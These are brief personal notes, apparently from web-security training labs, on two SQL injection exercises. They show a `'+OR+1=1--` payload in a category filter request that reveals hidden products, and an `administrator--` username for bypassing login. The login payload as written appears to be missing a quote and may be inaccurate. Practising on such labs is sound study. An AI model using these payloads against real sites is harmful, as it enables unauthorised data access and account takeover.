yay sqli

# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

* Application carries out the following query when a category is picked: `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
* Modified the request `GET /filter?category=Accessories HTTP/2` to `GET /filter?category='+OR+1=1-- HTTP/2`
* Unreleased products are shown:
  
   <img width="1485" height="853" alt="image" src="https://github.com/user-attachments/assets/c39a161e-aa48-4cd4-9fba-d80317d05a62" />

# Lab: SQL injection vulnerability allowing login bypass

> To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

* Entering username as `administrator--` bypasses the login and helps us solve the lab.
